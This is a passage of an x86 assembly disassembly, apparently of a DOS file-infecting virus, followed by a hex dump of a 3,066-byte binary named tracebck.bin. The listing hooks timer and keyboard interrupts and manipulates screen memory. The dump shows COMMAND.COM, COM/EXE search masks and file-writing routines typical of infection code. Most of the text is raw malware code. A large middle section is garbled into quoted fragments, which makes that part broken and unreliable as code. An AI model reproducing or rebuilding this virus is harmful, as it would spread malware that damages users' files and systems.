     097B  87 06 0024				XCHG	AX,DS:DATA_5E		; (0000:0024=0F6AH)
     097F  2E: A3 0973				MOV	WORD PTR CS:[973H],AX	; (8981:0973=33A5H)
     0983  8C C8				MOV	AX,CS
     0985  87 06 0026				XCHG	AX,DS:DATA_6E		; (0000:0026=10A8H)
     0989  2E: A3 0975				MOV	WORD PTR CS:[975H],AX	; (8981:0975=8EC0H)
     098D			LOC_60:						;  xref 8981:0935
     098D  B9 0050				MOV	CX,50H
     0990  B8 0F00				MOV	AX,0F00H
     0993  BF 0105				MOV	DI,105H
     0996  F3/ AB				REP	STOSW			; Rep when cx >0 Store ax to es:[di]
     0998  2E: 80 26 0972 07			AND	BYTE PTR CS:[972H],7	; (8981:0972=0F3H)
     099E			LOC_61:						;  xref 8981:0939, 0954
     099E  5F					POP	DI
     099F  5E					POP	SI
     09A0  07					POP	ES
     09A1  1F					POP	DS
     09A2  59					POP	CX
     09A3  E9 00E0				JMP	LOC_73			; (0A86)
     09A6			LOC_62:						;  xref 8981:09B5
     09A6  EB 83				JMP	SHORT LOC_57		; (092B)

                                                |-----------------------------------------------------
     -------------------------------------------| INT 1C        ->      CS:09A8  (jmp far from ....
                                                |-----------------------------------------------------
     09A8  50					PUSH	AX
     09A9  2E: C6 06 0979 00			MOV	BYTE PTR CS:[979H],0	; (8981:0979=92H)
     09AF  2E: A0 0972				MOV	AL,BYTE PTR CS:[972H]	; (8981:0972=0F3H)
     09B3  A8 60				TEST	AL,60H			; '`'
     09B5  75 EF				JNZ	LOC_62			; Jump if not zero
     09B7  A8 80				TEST	AL,80H
     09B9  74 40				JZ	LOC_65			; Jump if zero
     09BB  2E: 83 3E 097E 00			CMP	WORD PTR CS:[97EH],0	; (8981:097E=2E00H)
     09C1  74 14				JE	LOC_63			; Jump if equal
     09C3  2E: FF 06 097E			INC	WORD PTR CS:[97EH]	; (8981:097E=2E00H)
     09C8  2E: 81 3E 097E 0444			CMP	WORD PTR CS:[97EH],444H	; (8981:097E=2E00H)
     09CF  7C 06				JL	LOC_63			; Jump if < 09d1="" e8="" 0108="" call="" sub_20="" ;="" (0adc)="" 09d4="" e9="" 00af="" jmp="" loc_73="" ;="" (0a86)="" 09d7="" loc_63:="" ;="" xref="" 8981:09c1,="" 09cf="" 09d7="" a8="" 18="" test="" al,18h="" 09d9="" 74="" 1d="" jz="" loc_64="" ;="" jump="" if="" zero="" 09db="" 2e:="" ff="" 0e="" 0977="" dec="" word="" ptr="" cs:[977h]="" ;="" (8981:0977="0B8D8H)" 09e0="" 75="" 16="" jnz="" loc_64="" ;="" jump="" if="" not="" zero="" 09e2="" 2e:="" 80="" 26="" 0972="" e7="" and="" byte="" ptr="" cs:[972h],0e7h="" ;="" (8981:0972="0F3H)" 09e8="" 2e:="" 80="" 0e="" 0972="" 40="" or="" byte="" ptr="" cs:[972h],40h="" ;="" (8981:0972="0F3H)" '@'="" 09ee="" a8="" 08="" test="" al,8="" 09f0="" 74="" 06="" jz="" loc_64="" ;="" jump="" if="" zero="" 09f2="" 2e:="" 80="" 0e="" 0972="" 20="" or="" byte="" ptr="" cs:[972h],20h="" ;="" (8981:0972="0F3H)" '="" '="" 09f8="" loc_64:="" ;="" xref="" 8981:09d9,="" 09e0,="" 09f0,="" 0a03="" 09f8="" e9="" 008b="" jmp="" loc_73="" ;="" (0a86)="" 09fb="" loc_65:="" ;="" xref="" 8981:09b9="" 09fb="" 2e:="" 80="" 36="" 0972="" 01="" xor="" byte="" ptr="" cs:[972h],1="" ;="" (8981:0972="0F3H)" 0a01="" a8="" 01="" test="" al,1="" 0a03="" 74="" f3="" jz="" loc_64="" ;="" jump="" if="" zero="" 0a05="" 53="" push="" bx="" 0a06="" 56="" push="" si="" 0a07="" 1e="" push="" ds="" 0a08="" 2e:="" 8e="" 1e="" 097c="" mov="" ds,word="" ptr="" cs:[97ch]="" ;="" (8981:097c="2406H)" 0a0d="" 33="" f6="" xor="" si,si="" ;="" zero="" register="" 0a0f="" 2e:="" c6="" 06="" 096e="" 00="" mov="" byte="" ptr="" cs:[96eh],0="" ;="" (8981:096e="0F6H)" 0a15="" loc_66:="" ;="" xref="" 8981:0a6c="" 0a15="" 2e:="" 8b="" 9c="" 0105="" mov="" bx,word="" ptr="" cs:[105h][si]="" ;="" (8981:0105="0CD19H)" 0a1a="" 0b="" db="" or="" bx,bx="" ;="" zero="" 0a1c="" 74="" 19="" jz="" loc_67="" ;="" jump="" if="" zero="" 0a1e="" 80="" 38="" 20="" cmp="" byte="" ptr="" [bx+si],20h="" ;="" '="" '="" 0a21="" 75="" 14="" jne="" loc_67="" ;="" jump="" if="" not="" equal="" 0a23="" 80="" b8="" ff60="" 20="" cmp="" byte="" ptr="" ds:data_35e[bx+si],20h="" ;="" (2406:ff60="65H)" '="" '="" 0a28="" 74="" 0d="" je="" loc_67="" ;="" jump="" if="" equal="" 0a2a="" b8="" 0720="" mov="" ax,720h="" 0a2d="" 87="" 80="" ff60="" xchg="" ax,ds:data_35e[bx+si]="" ;="" (2406:ff60="6465H)" 0a31="" 89="" 00="" mov="" [bx+si],ax="" 0a33="" 81="" c3="" 00a0="" add="" bx,0a0h="" 0a37="" loc_67:="" ;="" xref="" 8981:0a1c,="" 0a21,="" 0a28="" 0a37="" 81="" fb="" 0fa0="" cmp="" bx,0fa0h="" 0a3b="" 74="" 07="" je="" loc_68="" ;="" jump="" if="" equal="" 0a3d="" 80="" 38="" 20="" cmp="" byte="" ptr="" [bx+si],20h="" ;="" '="" '="" 0a40="" 75="" 02="" jne="" loc_68="" ;="" jump="" if="" not="" equal="" 0a42="" 75="" 17="" jnz="" loc_71="" ;="" jump="" if="" not="" zero="" 0a44="" loc_68:="" ;="" xref="" 8981:0a3b,="" 0a40="" 0a44="" bb="" 0f00="" mov="" bx,0f00h="" 0a47="" loc_69:="" ;="" xref="" 8981:0a59="" 0a47="" 80="" 38="" 20="" cmp="" byte="" ptr="" [bx+si],20h="" ;="" '="" '="" 0a4a="" 75="" 07="" jne="" loc_70="" ;="" jump="" if="" not="" equal="" 0a4c="" 80="" b8="" ff60="" 20="" cmp="" byte="" ptr="" ds:data_35e[bx+si],20h="" ;="" (2406:ff60="65H)" '="" '="" 0a51="" 75="" 08="" jne="" loc_71="" ;="" jump="" if="" not="" equal="" 0a53="" loc_70:="" ;="" xref="" 8981:0a4a="" 0a53="" 81="" eb="" 00a0="" sub="" bx,0a0h="" 0a57="" 0b="" db="" or="" bx,bx="" ;="" zero="" 0a59="" 75="" ec="" jnz="" loc_69="" ;="" jump="" if="" not="" zero="" 0a5b="" loc_71:="" ;="" xref="" 8981:0a42,="" 0a51="" 0a5b="" 2e:="" 89="" 9c="" 0105="" mov="" word="" ptr="" cs:[105h][si],bx="" ;="" (8981:0105="0CD19H)" 0a60="" 2e:="" 09="" 1e="" 096e="" or="" word="" ptr="" cs:[96eh],bx="" ;="" (8981:096e="0BFF6H)" 0a65="" 83="" c6="" 02="" add="" si,2="" 0a68="" 81="" fe="" 00a0="" cmp="" si,0a0h="" 0a6c="" 75="" a7="" jne="" loc_66="" ;="" jump="" if="" not="" equal="" 0a6e="" 2e:="" 80="" 3e="" 096e="" 00="" cmp="" byte="" ptr="" cs:[96eh],0="" ;="" (8981:096e="0F6H)" 0a74="" 75="" 0d="" jne="" loc_72="" ;="" jump="" if="" not="" equal="" 0a76="" 2e:="" 80="" 0e="" 0972="" 80="" or="" byte="" ptr="" cs:[972h],80h="" ;="" (8981:0972="0F3H)" 0a7c="" 2e:="" c7="" 06="" 097e="" 0001="" mov="" word="" ptr="" cs:[97eh],1="" ;="" (8981:097e="2E00H)" 0a83="" loc_72:="" ;="" xref="" 8981:0a74="" 0a83="" 1f="" pop="" ds="" 0a84="" 5e="" pop="" si="" 0a85="" 5b="" pop="" bx="" 0a86="" loc_73:="" ;="" xref="" 8981:09a3,="" 09d4,="" 09f8="" 0a86="" 58="" pop="" ax="" 0a87="" ea="" f000:ff53="" ;*="" jmp="" far="" ptr="" loc_88="" ;="" (f000:ff53)="" 0a8c="" loc_74:="" ;="" xref="" 8981:0ab1,="" 0ab9,="" 0ac6,="" 0ada="" ;="" 0ae9="" 0a8c="" b0="" 20="" mov="" al,20h="" ;="" '="" '="" 0a8e="" e6="" 20="" out="" 20h,al="" ;="" port="" 20h,="" 8259-1="" int="" command="" ;="" al="20H," end="" of="" interrupt="" 0a90="" 58="" pop="" ax="" 0a91="" cf="" iret="" ;="" interrupt="" return="" 0a92="" .50="" push="" ax="" 0a93="" e4="" 60="" in="" al,60h="" ;="" port="" 60h,="" keybd="" scan="" or="" sw1="" 0a95="" 2e:="" a2="" 097a="" mov="" byte="" ptr="" cs:[97ah],al="" ;="" (8981:097a="0BH)" 0a99="" e4="" 61="" in="" al,61h="" ;="" port="" 61h,="" 8255="" port="" b,="" read="" 0a9b="" 8a="" e0="" mov="" ah,al="" 0a9d="" 0c="" 80="" or="" al,80h="" 0a9f="" e6="" 61="" out="" 61h,al="" ;="" port="" 61h,="" 8255="" b="" -="" spkr,="" etc="" 0aa1="" 8a="" c4="" mov="" al,ah="" 0aa3="" e6="" 61="" out="" 61h,al="" ;="" port="" 61h,="" 8255="" b="" -="" spkr,="" etc="" ;="" al="0," disable="" parity="" 0aa5="" 2e:="" 80="" 3e="" 0979="" 00="" cmp="" byte="" ptr="" cs:[979h],0="" ;="" (8981:0979="92H)" 0aab="" 2e:="" c6="" 06="" 0979="" 01="" mov="" byte="" ptr="" cs:[979h],1="" ;="" (8981:0979="92H)" 0ab1="" 75="" d9="" jnz="" loc_74="" ;="" jump="" if="" not="" zero="" 0ab3="" 2e:="" a0="" 097a="" mov="" al,byte="" ptr="" cs:[97ah]="" ;="" (8981:097a="0BH)" 0ab7="" 3c="" f0="" cmp="" al,0f0h="" 0ab9="" 74="" d1="" je="" loc_74="" ;="" jump="" if="" equal="" 0abb="" 24="" 7f="" and="" al,7fh="" 0abd="" 2e:="" 3a="" 06="" 097b="" cmp="" al,byte="" ptr="" cs:[97bh]="" ;="" (8981:097b="87H)" 0ac2="" 2e:="" a2="" 097b="" mov="" byte="" ptr="" cs:[97bh],al="" ;="" (8981:097b="87H)" 0ac6="" 74="" c4="" jz="" loc_74="" ;="" jump="" if="" zero="" 0ac8="" 2e:="" 83="" 3e="" 097e="" 00="" cmp="" word="" ptr="" cs:[97eh],0="" ;="" (8981:097e="2E00H)" 0ace="" 74="" 07="" je="" loc_75="" ;="" jump="" if="" equal="" 0ad0="" 2e:="" c7="" 06="" 097e="" 0001="" mov="" word="" ptr="" cs:[97eh],1="" ;="" (8981:097e="2E00H)" 0ad7="" loc_75:="" ;="" xref="" 8981:0ace="" 0ad7="" e8="" 0002="" call="" sub_20="" ;="" (0adc)="" 0ada="" eb="" b0="" jmp="" short="" loc_74="" ;="" (0a8c)="" ;="=========================================================================" ;="" subroutine="" ;="" called="" from:="" 8981:09d1,="" 0ad7="" ;="=========================================================================" sub_20="" proc="" near="" 0adc="" 2e:="" c7="" 06="" 0977="" 0028="" mov="" word="" ptr="" cs:[977h],28h="" ;="" (8981:0977="0B8D8H)" 0ae3="" 2e:="" f6="" 06="" 0972="" 80="" test="" byte="" ptr="" cs:[972h],80h="" ;="" (8981:0972="0F3H)" 0ae9="" 74="" a1="" jz="" loc_74="" ;="" jump="" if="" zero="" 0aeb="" 2e:="" c6="" 06="" 0970="" 01="" mov="" byte="" ptr="" cs:[970h],1="" ;="" (8981:0970="0F5H)" 0af1="" 53="" push="" bx="" 0af2="" 56="" push="" si="" 0af3="" 1e="" push="" ds="" 0af4="" 2e:="" 8e="" 1e="" 097c="" mov="" ds,word="" ptr="" cs:[97ch]="" ;="" (8981:097c="2406H)" 0af9="" 2e:="" f6="" 06="" 0972="" 10="" test="" byte="" ptr="" cs:[972h],10h="" ;="" (8981:0972="0F3H)" 0aff="" 75="" 2f="" jnz="" loc_79="" ;="" jump="" if="" not="" zero="" 0b01="" 2e:="" 80="" 0e="" 0972="" 10="" or="" byte="" ptr="" cs:[972h],10h="" ;="" (8981:0972="0F3H)" 0b07="" 33="" f6="" xor="" si,si="" ;="" zero="" register="" 0b09="" loc_76:="" ;="" xref="" 8981:0b2e="" 0b09="" bb="" 0f00="" mov="" bx,0f00h="" 0b0c="" loc_77:="" ;="" xref="" 8981:0b15="" 0b0c="" 80="" 38="" 20="" cmp="" byte="" ptr="" [bx+si],20h="" ;="" '="" '="" 0b0f="" 74="" 09="" je="" loc_78="" ;="" jump="" if="" equal="" 0b11="" 81="" eb="" 00a0="" sub="" bx,0a0h="" 0b15="" 73="" f5="" jnc="" loc_77="" ;="" jump="" if="" carry="0" 0b17="" bb="" 0f00="" mov="" bx,0f00h="" 0b1a="" loc_78:="" ;="" xref="" 8981:0b0f="" 0b1a="" 81="" c3="" 00a0="" add="" bx,0a0h="" 0b1e="" 2e:="" 89="" 9c="" 0105="" mov="" word="" ptr="" cs:[105h][si],bx="" ;="" (8981:0105="0CD19H)" 0b23="" 2e:="" 89="" 9c="" 0980="" mov="" word="" ptr="" cs:[980h][si],bx="" ;="" (8981:0980="73A3H)" 0b28="" 46="" inc="" si="" 0b29="" 46="" inc="" si="" 0b2a="" 81="" fe="" 00a0="" cmp="" si,0a0h="" 0b2e="" 75="" d9="" jne="" loc_76="" ;="" jump="" if="" not="" equal="" 0b30="" loc_79:="" ;="" xref="" 8981:0aff="" 0b30="" 33="" f6="" xor="" si,si="" ;="" zero="" register="" 0b32="" loc_80:="" ;="" xref="" 8981:0b9b="" 0b32="" 2e:="" 81="" bc="" 0105="" 0fa0="" cmp="" word="" ptr="" cs:[105h][si],0fa0h="" ;="" (8981:0105="0CD19H)" 0b39="" 74="" 5a="" je="" loc_86="" ;="" jump="" if="" equal="" 0b3b="" 2e:="" 8b="" 9c="" 0980="" mov="" bx,word="" ptr="" cs:[980h][si]="" ;="" (8981:0980="73A3H)" 0b40="" 8b="" 00="" mov="" ax,[bx+si]="" 0b42="" 2e:="" 3b="" 80="" 0cf5="" cmp="" ax,cs:data_104e[bx+si]="" ;="" (8981:0cf5="0)" 0b47="" 75="" 15="" jne="" loc_82="" ;="" jump="" if="" not="" equal="" 0b49="" 53="" push="" bx="" 0b4a="" loc_81:="" ;="" xref="" 8981:0b57,="" 0b5b="" 0b4a="" 0b="" db="" or="" bx,bx="" ;="" zero="" 0b4c="" 74="" 33="" jz="" loc_84="" ;="" jump="" if="" zero="" 0b4e="" 81="" eb="" 00a0="" sub="" bx,0a0h="" 0b52="" 2e:="" 3b="" 80="" 0cf5="" cmp="" ax,cs:data_104e[bx+si]="" ;="" (8981:0cf5="0)" 0b57="" 75="" f1="" jne="" loc_81="" ;="" jump="" if="" not="" equal="" 0b59="" 3b="" 00="" cmp="" ax,[bx+si]="" 0b5b="" 74="" ed="" je="" loc_81="" ;="" jump="" if="" equal="" 0b5d="" 5b="" pop="" bx="" 0b5e="" loc_82:="" ;="" xref="" 8981:0b47="" 0b5e="" 0b="" db="" or="" bx,bx="" ;="" zero="" 0b60="" 75="" 06="" jnz="" loc_83="" ;="" jump="" if="" not="" zero="" 0b62="" c7="" 04="" 0720="" mov="" word="" ptr="" [si],720h="" 0b66="" eb="" 1a="" jmp="" short="" loc_85="" ;="" (0b82)="" 0b68="" loc_83:="" ;="" xref="" 8981:0b60="" 0b68="" 8b="" 00="" mov="" ax,[bx+si]="" 0b6a="" 89="" 80="" ff60="" mov="" ds:data_35e[bx+si],ax="" ;="" (2406:ff60="6465H)" 0b6e="" c7="" 00="" 0720="" mov="" word="" ptr="" [bx+si],720h="" 0b72="" 2e:="" 81="" ac="" 0980="" 00a0="" sub="" word="" ptr="" cs:[980h][si],0a0h="" ;="" (8981:0980="73A3H)" 0b79="" 2e:="" c6="" 06="" 0970="" 00="" mov="" byte="" ptr="" cs:[970h],0="" ;="" (8981:0970="0F5H)" 0b7f="" eb="" 14="" jmp="" short="" loc_86="" ;="" (0b95)="" 0b81="" loc_84:="" ;="" xref="" 8981:0b4c="" 0b81="" 5b="" pop="" bx="" 0b82="" loc_85:="" ;="" xref="" 8981:0b66="" 0b82="" 2e:="" 8b="" 9c="" 0105="" mov="" bx,word="" ptr="" cs:[105h][si]="" ;="" (8981:0105="0CD19H)" 0b87="" 81="" c3="" 00a0="" add="" bx,0a0h="" 0b8b="" 2e:="" 89="" 9c="" 0105="" mov="" word="" ptr="" cs:[105h][si],bx="" ;="" (8981:0105="0CD19H)" 0b90="" 2e:="" 89="" 9c="" 0980="" mov="" word="" ptr="" cs:[980h][si],bx="" ;="" (8981:0980="73A3H)" 0b95="" loc_86:="" ;="" xref="" 8981:0b39,="" 0b7f="" 0b95="" 46="" inc="" si="" 0b96="" 46="" inc="" si="" 0b97="" 81="" fe="" 00a0="" cmp="" si,0a0h="" 0b9b="" 75="" 95="" jne="" loc_80="" ;="" jump="" if="" not="" equal="" 0b9d="" 2e:="" 80="" 3e="" 0970="" 00="" cmp="" byte="" ptr="" cs:[970h],0="" ;="" (8981:0970="0F5H)" 0ba3="" 74="" 40="" je="" loc_87="" ;="" jump="" if="" equal="" 0ba5="" 06="" push="" es="" 0ba6="" 57="" push="" di="" 0ba7="" 51="" push="" cx="" 0ba8="" 1e="" push="" ds="" 0ba9="" 07="" pop="" es="" 0baa="" 0e="" push="" cs="" 0bab="" 1f="" pop="" ds="" 0bac="" be="" 0cf5="" mov="" si,0cf5h="" 0baf="" 33="" ff="" xor="" di,di="" ;="" zero="" register="" 0bb1="" b9="" 07d0="" mov="" cx,7d0h="" 0bb4="" f3/="" a5="" rep="" movsw="" ;="" rep="" when="" cx="">0 Mov [si] to es:[di]
     0BB6  2E: C7 06 0977 FFDC			MOV	WORD PTR CS:[977H],0FFDCH	; (8981:0977=0B8D8H)
     0BBD  2E: 80 26 0972 04			AND	BYTE PTR CS:[972H],4	; (8981:0972=0F3H)
     0BC3  2E: 80 0E 0972 88			OR	BYTE PTR CS:[972H],88H	; (8981:0972=0F3H)
     0BC9  2E: C7 06 097E 0000			MOV	WORD PTR CS:[97EH],0	; (8981:097E=2E00H)
     0BD0  33 C0				XOR	AX,AX			; Zero register
     0BD2  8E D8				MOV	DS,AX
     0BD4  2E: A1 0973				MOV	AX,WORD PTR CS:[973H]	; (8981:0973=33A5H)
     0BD8  A3 0024				MOV	DS:DATA_5E,AX		; (0000:0024=0F6AH)
     0BDB  2E: A1 0975				MOV	AX,WORD PTR CS:[975H]	; (8981:0975=8EC0H)
     0BDF  A3 0026				MOV	DS:DATA_6E,AX		; (0000:0026=10A8H)
     0BE2  59					POP	CX
     0BE3  5F					POP	DI
     0BE4  07					POP	ES
     0BE5			LOC_87:						;  xref 8981:0BA3
     0BE5  1F					POP	DS
     0BE6  5E					POP	SI
     0BE7  5B					POP	BX
     0BE8  C3					RETN
				SUB_20		ENDP

				;==========================================================================
				;			       SUBROUTINE
				;         Called from:	 8981:038A, 03A3
				;==========================================================================

				SUB_21		PROC	NEAR
     0BE9  FC					CLD				; Clear direction
     0BEA  58					POP	AX
     0BEB  2B C6				SUB	AX,SI
     0BED  03 C7				ADD	AX,DI
     0BEF  06					PUSH	ES
     0BF0  50					PUSH	AX
     0BF1  F3/ A4				REP	MOVSB			; Rep when cx >0 Mov [si] to es:[di]
     0BF3  CB					RETF				; Return far
				SUB_21		ENDP

     0BF4  90 50 E8 E2 03 8B			DB	 90H, 50H,0E8H,0E2H, 03H, 8BH

				SEG_A		ENDS
						END	START

---------------------------------------------------------------
| Dump Mader   Ver 2.2               Tue Jan 08 18:29:50 1991 |
---------------------------------------------------------------

Dumping file : tracebck.bin
               3066 bytes length
               9:15:23  15-6-1989  created (modifyed)

0000:   EB2E90FF FB0001BB  0C4D0000 00EB2E90   FFFF6C6C 6F202D20  436F7079 72696768   ".........M........llo - Copyrigh"
0020:   74205320 26205320  45000000 00000000   00000000 00000000  00000000 00000000   "t S & S E......................."
0040:   00000000 00000050  4C494300 00000000   00000000 00000000  00000000 00000000   ".......PLIC....................."
0060:   00000000 00000000  00000000 00000000   00000000 00000000  00000000 00000000   "................................"
0080:   00000000 00000003  3F3F3F3F 3F3F3F3F   434F4D20 02000000  633A5C6D 201A00AF   "........????????COM ....c:\m ..."
00A0:   0A955800 00434F4D  4D414E44 2E434F4D   00000001 3F3F3F3F  3F3F3F3F 3F3F3F10   "..X..COMMAND.COM....???????????."
00C0:   05000000 00000000  20E911B5 12F64802   00434154 2D54574F  2E415243 00000000   "........ .....H..CAT-TWO.ARC...."
00E0:   EB0A0202 2000B622  7411EB04 170A0000   0051598B 0F200056  4731EB02 F50BE871   ".... .."t........QY.. .VG1.....q"
0100:   06E82806 B419CD21  89B45101 81845101   84088C8C 53018884  E300E808 058A95E2   "..(....!..Q...Q.....S..........."
0120:   008CD80E 1F7513C7  84510184 09898453   0180FAFF 7404B40E  CD21C684 720880C7   ".....u...Q.....S....t....!..r..."
0140:   84EF0000 00B42ACD  2181F9C4 077D07EB   288C0FEB 0A007F0F  80FE0C7C 1C80FA05   "......*.!....}..(..........|...."
0160:   7C1780FA 1C7C0BC7  847708DC FFC68472   088880BC 0400F873  152EC684 EE0000E9   "|....|...w.....r.......s........"
0180:   950180BC 0400F873  05808C72 0804C684   DF00008B 9451018E  9C5301B8 0043E84C   ".......s...r.........Q...S...C.L"
01A0:   0172442E 898CF500  80E1FEB8 0143E83C   017234B8 023DCD21  722D0E1F 8984EF00   ".rD..........C.<.r4..=.!r-......" 01c0:="" 8bd8b800="" 57cd2189="" 8cf10089="" 94f300fe="" 8c04008b="" 9480088b="" 8c820881="" c2040083="" "....w.!........................."="" 01e0:="" d100b800="" 42cd210e="" 1ff68472="" 08047406="" e8e301e9="" 210132d2="" b4475683="" c646cd21="" "....b.!....r..t.....!.2..gv..f.!"="" 0200:="" 5e80bcee="" 00007505="" e8f00073="" 03e969ff="" 8bd681c2="" 8700b41a="" cd21c744="" 052a2ec7="" "^.....u....s..i..........!.d.*.."="" 0220:="" 4407434f="" c744094d="" 00b44e8b="" d683c205="" b92000e8="" b7007228="" 8bd681c2="" a500c684="" "d.co.d.m..n......="" ....r(........"="" 0240:="" 550100e8="" a6017206="" e88b01e9="" bd0080bc="" ee000075="" f680bc55="" 01007546="" b44febd0="" "u.....r............u...u..uf.o.."="" 0260:="" c7440745="" 58c74409="" 4500b44e="" 8bd683c2="" 05b92000="" e8760072="" 298bd681="" c2a500c6="" ".d.ex.d.e..n......="" ..v.r)......."="" 0280:="" 84550100="" e8650172="" 06e84a01="" eb7d902e="" 80bcee00="" 0075f580="" bc550100="" 7504b44f="" ".u...e.r..j..}.......u...u..u..o"="" 02a0:="" ebcfe856="" 008bd681="" c2b300b4="" 1acd21b4="" 4fb91000="" 80bcdf00="" 007516c6="" 84df0001="" "...v..........!.o........u......"="" 02c0:="" c744052a="" 2ec74407="" 2a00b44e="" 8bd683c2="" 05e81900="" 7235f684="" c8001074="" d28bd681="" ".d.*..d.*..n........r5.....t...."="" 02e0:="" c2d100b4="" 3be80500="" 7221e923="" ffcd2172="" 092ef684="" ee00ff74="" 01f9c3c7="" 44055c00="" "....;...r!.#..!r.......t....d.\."="" 0300:="" 8bd683c2="" 05b43be8="" e3ffc3e8="" edff8bd6="" 83c246b4="" 3bcd218b="" 9cef000b="" db74298b="" "......;...........f.;.!......t)."="" 0320:="" 8cf5008b="" 9451018e="" 9c530183="" f9207405="" b80143cd="" 210e1f8b="" 8cf1008b="" 94f300b8="" ".....q...s...="" t...c.!..........."="" 0340:="" 0157cd21="" b43ecd21="" 8a94e300="" b40ecd21="" e8fe0358="" 8984e000="" 807c03ff="" 740b0510="" ".w.!.="">.!.......!...X.....|..t..."
0360:   00014402 581F2EFF  2CE8B902 0E1F8B04   A300018A 4402A202  0174368C DB81C3D0   "..D.X...,...........D....t6....."
0380:   018EC38B FE8BD6B9  FA0BE85C 088BCA8B   F24E8BFE FDF3A41E  07BF0001 8EDB8BF2   "...........\.....N.............."
03A0:   B9FA0BE8 4308BE00  010E1FE8 D602BAD0   018CCF03 FAC74405  0001897C 07581F8E   "....C.................D....|.X.."
03C0:   DF8EC78E D733DB33  C933ED2E FF6C052E   C684EE00 00C38B9C  EF000BDB 740D8BD6   ".....3.3.3...l..............t..."
03E0:   81C20400 B90100B4  40CD21C3 52B419CD   210441B4 3A898484  08C68486 085C5681   "........@.!.R...!.A.:........\V."
0400:   C68708B4 478BFE32  D2CD215E 4F478A05   0AC075F9 5BC6055C  478BD38A 07880543   "....G..2..!^OG....u.[..\G......C"
0420:   470AC075 F6B80043  E8C2FE72 A22E898C   E40081E1 FE00B801  43E8B1FE 7291B802   "G..u...C...r............C...r..."
0440:   3DE8A9FE 72898BD8  1E52E827 005A1F9C   2E8B8CE4 0083F920  7405B801 43CD212E   "=...r....R.'.Z......... t...C.!."
0460:   8B8CE600 2E8B94E8  00B80157 CD21B43E   CD219DC3 B80057CD  210E1F89 8CE60089   "...........W.!.>.!....W.!......."
0480:   94E8008B D683C20D  8BFAB43F B91C00CD   21813D4D 5A7473E8  810105F5 0C722680   "...........?....!.=MZts......r&."
04A0:   3DE97522 8B550133  C9B80042 CD218BD7   83C21CB4 3FB90300  CD21E8A5 0073072E   "=.u".U.3...B.!......?....!...s.."
04C0:   C6845501 01C3E852  01898480 08899482   0850C745 03FFFFB9  0500B440 8BD7CD21   "..U....R.........P.E.......@...!"
04E0:   8BD683C2 05B9F50B  B440CD21 B8004233   C933D2CD 21C605E9  5805F700 8945018B   ".........@.!..B3.3..!...X....E.."
0500:   D7B90300 B440CD21  F8C3837D 0CFF755F   568B7514 8B4D168B  C18ACD32 EDD1E9D1   ".....@.!...}..u_V.u..M.....2...."
0520:   E9D1E9D1 E9D1E0D1  E0D1E0D1 E003F083   D10083EE 0383D900  8B4508E8 CA0003F0   ".........................E......"
0540:   13CA8BD6 5EB80042  CD218BD7 83C21CB4   3FB90300 CD21E809  0073182E C6845501   "....^..B.!......?....!...s....U."
0560:   01C3817D 1C564775  08807D1E 317502F9   C3F8C3E8 A5008984  80088994 82088B4D   "...}.VGu..}.1u.................M"
0580:   04D1E186 E98BE981  E500FF32 ED036D06   83D1002B E81BCA72  D75052FF 7518C645   "...........2..m....+...r.PR.u..E"
05A0:   18FFB905 00B4408B  D783C214 CD218F45   188BD683 C205B9F5  0BB440CD 21B80042   "......@......!.E..........@.!..B"
05C0:   33C933D2 CD218F45  168F4514 814514FA   00835516 008B4508  E82D0029 45141955   "3.3..!.E..E..E....U...E..-.)E..U"
05E0:   16B10CD3 6516B8FA  0B034502 89450281   6502FF01 8AC432E4  D1E80145 048BD7B9   "....e.....E..E..e.....2....E...."
0600:   1C00B440 CD21F8C3  33D2D1E0 D1D2D1E0   D1D2D1E0 D1D2D1E0  D1D2C333 D233C9B8   "...@.!..3..................3.3.."
0620:   0242CD21 C333C08E  D8C53E9C 00C57D01   8BC781EF 5F07E829  0074268B F881EF55   ".B.!.3....>...}....._..).t&....U"
0640:   07E81E00 741BC53E  8000C57D 018BC781   EF7606E8 0C007409  8BF881EF 7306E801   "....t..>...}.....v....t.....s..."
0660:   00C333D2 813D5647  7506807D 02317401   4281EFF7 000BD2C3  B0EAAA8B C103C6AB   "..3..=VGu..}.1t.B..............."
0680:   8CC8ABC3 0BD274FB  1E068E84 E000BFEC   00FCB9A8 09E8E0FF  B96A07E8 DAFFB9BE   "......t..................j......"
06A0:   07E8D4FF B94C08E8  CEFF33C0 8ED8FAB8   EC008706 70002E89  84880A8C C0870672   ".....L....3.........p..........r"
06C0:   002E8984 8A0AB8F1  00870680 002E8984   6E078CC0 87068200  2E898470 07B8F600   "................n..........p...."
06E0:   87068400 2E8984DC  078CC087 0686002E   8984DE07 B8FB0087  069C002E 89845708   "..............................W."
0700:   8CC08706 9E002E89  84590807 1FFBC306   8E84E000 BFF100FC  B96D07E8 5AFFB9E0   ".........Y...............m..Z..."
0720:   07E854FF B95608E8  4EFF07C3 0633C08E   C0B85B08 03C62687  06900089 84EA008C   "..T..V..N....3....[...&........."
0740:   C8268706 92008984  EC0007C6 84EE0000   C30633C0 8EC02E8B  84EA0026 A390002E   ".&................3........&...."
0760:   8B84EC00 26A39200  07C3EB35 90EA6C13   91025B1E 501E0E1F  E800005E 81EE7B07   "....&......5..l...[.P......^..{."
0780:   FFE3E8ED FF518B44  078CC13B C1591F58   750B0E07 80FC4974  0481C3D0 011FEB3B   ".....Q.D...;.Y.Xu.....It.......;"
07A0:   9033D2E8 CCFF0652  FAE863FF FB58BAD0   0103D083 C210071F  581FB431 EB1D80FC   ".3.....R..c..X..........X..1...."
07C0:   4C74DE80 FC3174DB  0AE474D5 80FC4974   B180FC4A 74AC80FC  4B740AEA 8D139102   "Lt...1t...t...It...Jt...Kt......"
07E0:   80FC4B75 F6515206  53565755 E883FFE8   3AFFFBF6 06720902  75F8FAF6 06720902   "..Ku.QR.SVWU....:....r..u....r.."
0800:   75F0800E 7209021F  8BDA2EC6 84E200FF   807F013A 750B8A07  0C202C61 2E8884E2   "u...r..............:u.... ,a...."
0820:   00565706 FC8BF20E  07BF8409 ACAA0AC0   75FA075F 5EE8EDFB  E816FF2E 80267209   ".VW.............u.._^........&r."
0840:   FD581F5D 5F5E5B07  5A59EB8F 83C20FB1   04D3EAE9 4DFFEAFE  5D910256 E800005E   ".X.]_^[.ZY..........M...]..V...^"
0860:   81EE5F08 2E808CEE  00015E32 C0CF0100   00008200 000000DC  FF000000 00B80000   ".._.......^2...................."
0880:   39000000 433A5C33  3036365C 48454C4C   4F2E434F 4D004558  45004500 00000000   "9...C:\3066\HELLO.COM.EXE.E....."
08A0:   00000000 00000000  00000000 00000000   00000000 00000000  00000000 00000000   "................................"
08C0:   00000000 00000000  00000000 00000000   00000000 00000000  00000000 00000000   "................................"
